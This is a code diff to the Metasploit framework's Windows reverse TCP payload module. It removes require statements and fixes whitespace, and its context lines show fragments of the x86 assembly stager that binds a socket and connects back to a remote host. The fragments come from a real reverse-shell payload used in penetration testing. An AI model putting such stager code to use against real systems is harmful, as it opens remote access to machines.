@@ -1,11 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/send_uuid'
-require 'msf/core/payload/windows/block_api'
-require 'msf/core/payload/windows/exitfunk'
-
 module Msf
 
 ###
@@ -168,7 +162,7 @@ module Payload::Windows::ReverseTcp
                                ; to cater for both IPv4 and IPv6
         loop push_0_loop
 
-                         ; bind to 0.0.0.0/[::], pushed above 
+                         ; bind to 0.0.0.0/[::], pushed above
         push #{encoded_bind_port}   ; family AF_INET and port number
         mov esi, esp           ; save a pointer to sockaddr_in struct
         push #{sockaddr_size}  ; length of the sockaddr_in struct (we only set the first 8 bytes, the rest aren't used)
@@ -181,7 +175,7 @@ module Payload::Windows::ReverseTcp
         mov esi, esp
       ^
     end
-    
+
     asm << %Q^
       try_connect:
         push 16                 ; length of the sockaddr struct
